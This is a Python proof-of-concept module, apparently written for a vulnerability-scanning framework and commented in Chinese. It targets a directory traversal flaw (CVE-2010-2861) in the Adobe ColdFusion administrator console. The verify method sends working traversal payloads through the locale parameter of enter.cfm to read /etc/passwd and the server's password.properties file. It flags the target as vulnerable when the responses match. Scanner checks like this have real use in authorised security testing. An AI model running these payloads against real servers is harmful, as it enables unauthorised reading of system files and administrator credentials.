# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Adobe-ColdFusion_0001_p'  # 平台漏洞编号，留空
    name = 'Adobe ColdFusion 任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2010-07-27'  # 漏洞公布时间
    desc = '''
        Adobe ColdFusion是一款高效的网络应用服务器开发环境。
        Adobe ColdFusion 9.0.1及之前版本的管理控制台中存在多个目录遍历漏洞。
        远程攻击者可借助向CFIDE/administrator/中的CFIDE/administrator/settings/mappings.cfm，logging/settings.cfm，datasources/index.cfm，j2eepackaging/editarchive.cfm和enter.cfm发送的locale参数读取任意文件。
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-2861'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2010-2861'  # cve编号
    product = 'Adobe-ColdFusion'  # 漏洞应用名称
    product_version = '8 & 9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '960cfcc9-4548-4cbf-b44c-41bc4828994b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 环境不同payload可能不同
            payload = '/CFIDE/administrator/enter.cfm?'
            data1 = 'locale=../../../../../../../../../../etc/passwd%00en'
            data2 = 'locale=../../../../../../../lib/password.properties%00en'
            url1 = self.target + payload + data1
            r1 = requests.get(url1)
            if 'root' in r1.text and '/bin/bash' in r1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url1))

            url2 = self.target + payload + data2
            r2 = requests.get(url2)
            if 'password=' in r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url2))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
